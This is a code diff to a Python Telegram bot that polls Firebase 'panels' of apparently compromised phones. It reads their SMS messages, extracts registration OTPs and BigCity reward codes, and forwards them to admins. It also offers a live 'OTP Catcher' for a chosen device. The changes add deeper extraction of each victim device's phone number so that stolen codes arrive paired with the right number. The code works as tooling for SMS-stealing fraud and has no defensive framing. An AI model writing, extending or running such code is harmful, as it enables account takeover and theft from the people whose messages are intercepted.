@@ -1,5 +1,5 @@
 """
-BigCity Firebase Monitor Bot (No Miss + Smart Number)
+BigCity Firebase Monitor Bot (Perfect Number Extractor)
 """
 import asyncio
 import json
@@ -51,8 +51,6 @@ active_watches = set()
 REWARD_PATTERN = re.compile(r"Reward\s*Code\s*(?:is|:)\s*([A-Z0-9]{6,20})", re.IGNORECASE)
 OTP_PATTERN    = re.compile(r"OTP\s*to\s*register\s*(?:is|:)\s*(\d{4,8})", re.IGNORECASE)
 BIGCITY_HINT   = re.compile(r"big\s*city", re.IGNORECASE)
-
-# Script wala Regex (10 digit number ke liye)
 PHONE_PATTERN = re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b")
 
 # ─── DATA MANAGEMENT ──────────────────────────────────────────────────────────
@@ -174,21 +172,43 @@ def clean_number(val: str) -> str:
     if len(digits) == 10: return digits
     return ""
 
-# ─── NUMBER EXTRACTION (SIRF MESSAGE SE, JAISE SCRIPT MEIN HAI) ─────────────
+# ─── NUMBER EXTRACTOR (DEVICE SE DEEP SEARCH) ───────────────────────────────
+def _extract_number(d: dict) -> str:
+    if not isinstance(d, dict): return ""
+    # Direct fields (jo screenshot mein the)
+    for f in ("Phone Number", "phoneNumber", "phone", "number", "mobile"):
+        if f in d and d[f]:
+            cleaned = clean_number(d[f])
+            if cleaned: return cleaned
+    # SMS fields
+    for f in ("Phone #1", "Phone_1", "phone1", "Phone #2", "Phone_2", "phone2"):
+        if f in d and d[f]:
+            cleaned = clean_number(d[f])
+            if cleaned: return cleaned
+    # Deep Nested Search
+    for k, v in d.items():
+        if isinstance(v, dict):
+            res = _extract_number(v)
+            if res: return res
+    return ""
+
 def extract_number_from_msg_text(text: str) -> str:
     if not text: return ""
     match = PHONE_PATTERN.search(text)
-    if match:
-        return clean_number(match.group(1))
+    if match: return clean_number(match.group(1))
     return ""
 
 async def fetch_online_devices(client, base, dev_node):
     path = f"/{dev_node}" if dev_node else ""
     data, _ = await api_get(client, f"{base}{path}.json", 15)
     if not isinstance(data, dict): return []
-    return [(did, "") for did, dd in data.items() if is_device_id(did) and isinstance(dd, dict) and device_is_online(dd)]
+    out = []
+    for did, dd in data.items():
+        if not is_device_id(did) or not isinstance(dd, dict) or not device_is_online(dd): continue
+        num = _extract_number(dd)
+        out.append((did, num))
+    return out
 
-# LIMIT 15 KAR DIYA HAI TAAKI EK BHI MESSAGE MISS NA HO
 async def fetch_last_messages(client, base, msg_node, dev_id, limit=15):
     path = f"/{msg_node}" if msg_node else ""
     url = f'{base}{path}/{dev_id}.json?orderBy="%24key"&limitToLast={limit}'
@@ -244,13 +264,12 @@ def fmt_otp(panel, did, num, sender, dt, otp, msg):
 
 # ─── MONITORING ──────────────────────────────────────────────────────────────
 
-async def process_device(client, pk, pc, did, state, admins, app):
+async def process_device(client, pk, pc, did, num, state, admins, app):
     base = pc["base"]
     msg_node = pc.get("message_node","")
     panel = pc.get("name","Panel")
     sent = 0
     try:
-        # 15 messages fetch karega
         msgs = await fetch_last_messages(client, base, msg_node, did, limit=15)
         if not msgs: return 0
         
@@ -285,8 +304,8 @@ async def process_device(client, pk, pc, did, state, admins, app):
                 
             sender, dt = extract_sender_time(md)
             
-            # Number message text se nikal raha hai (Script wala tarika)
-            actual_num = extract_number_from_msg_text(text)
+            # Number: Pehle device se, agar N/A ho toh text se
+            actual_num = num if num else extract_number_from_msg_text(text)
             
             if kind == "reward":
                 token = f"{pk}~{did}~{int(time.time())}"
@@ -324,7 +343,7 @@ async def monitor_panels(context: ContextTypes.DEFAULT_TYPE):
                     online = await asyncio.wait_for(fetch_online_devices(client, base, pc.get("device_node","")), timeout=25)
                     if not online: continue
                     
-                    tasks = [process_device(client, pk, pc, did, state, admins, app) for did, _ in online]
+                    tasks = [process_device(client, pk, pc, did, num, state, admins, app) for did, num in online]
                     results = await asyncio.gather(*tasks, return_exceptions=True)
                     for r in results:
                         if isinstance(r, int): total += r
@@ -382,6 +401,14 @@ async def otp_watch(app, chat_id, pk, did):
         async with httpx.AsyncClient(timeout=httpx.Timeout(API_TIMEOUT)) as client:
             for mk, md in (await fetch_last_messages(client, base, msg_node, did, limit=15)).items():
                 if isinstance(md, dict): seen.add(str(md.get("id", mk)))
+            
+            # Fetch exact number for watch
+            dev_num = ""
+            try:
+                path = f"/{pc.get('device_node','')}" if pc.get("device_node") else ""
+                dd, _ = await api_get(client, f"{base}{path}/{did}.json", 6)
+                if isinstance(dd, dict): dev_num = _extract_number(dd)
+            except Exception: pass
                 
             watch_msg = await app.bot.send_message(chat_id, f"🎯 <b>OTP Catcher active</b> — <code>{did}</code>\nMax 5 min, sirf naya OTP.\n<i>(Manually band karne ke liye niche button dabayein)</i>", parse_mode="HTML", reply_markup=stop_btn)
             last_ping = time.time()
@@ -400,7 +427,7 @@ async def otp_watch(app, chat_id, pk, did):
                         kind, payload = classify_bigcity(text)
                         if kind != "otp": continue
                         sender, dt = extract_sender_time(md)
-                        actual_num = extract_number_from_msg_text(text)
+                        actual_num = dev_num if dev_num else extract_number_from_msg_text(text)
                         await app.bot.send_message(chat_id, fmt_otp(panel, did, actual_num, sender, dt, payload, text), parse_mode="HTML", disable_web_page_preview=True)
                         try: await watch_msg.edit_reply_markup(reply_markup=None)
                         except Exception: pass
